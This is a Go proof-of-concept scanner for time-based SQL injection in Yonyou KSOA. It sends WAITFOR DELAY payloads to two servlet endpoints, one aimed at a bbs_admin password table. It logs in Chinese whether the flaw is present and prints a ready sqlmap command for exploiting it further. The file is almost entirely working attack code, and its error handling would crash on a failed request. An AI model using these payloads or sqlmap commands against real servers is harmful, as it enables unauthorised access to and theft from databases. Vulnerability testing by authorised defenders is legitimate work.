package poc

import (
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"
)

var SqlPath = []string{
	"/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1%27;WAITFOR%20DELAY%20%270:0:5%27--", //
	"/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:5%27--",
}

func KSOASQL(target string, Path string) {
	url := strings.TrimRight(target, "/")
	pocURL := url + Path
	client := http.Client{Timeout: 10 * time.Second}
	startTime := time.Now()
	response, err := client.Get(pocURL)
	if err != nil {
		log.Printf("ERROR: %s\n", err)
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		elapsed := time.Since(startTime)
		elapsedSeconds := elapsed.Seconds()

		if elapsedSeconds >= 5 {
			if regexp.MustCompile("TaskRequestServlet").MatchString(Path) {
				log.Println("[+] 存在用友 KSOA TaskRequestServlet SQL注入")
				log.Println("[+] sqlmap命令：sqlmap.py -u \" " + pocURL + "\" --technique=T --dbms mssql --time-sec 5 --random-agent --hex")
			} else if regexp.MustCompile("imagefield").MatchString(Path) {
				log.Println("[+] 存在用友 KSOA imagefield SQL注入")
				log.Println("[+] sqlmap命令：sqlmap.py -u \" " + pocURL + "\" --technique=S --dbms mssql --random-agent --hex")
			}
		}
	} else {
		if regexp.MustCompile("TaskRequestServlet").MatchString(Path) {
			log.Println("[-] 不存在用友 KSOA TaskRequestServlet SQL注入")
		} else if regexp.MustCompile("imagefield").MatchString(Path) {
			log.Println("[-] 不存在用友 KSOA imagefield SQL注入")
		}

	}
}
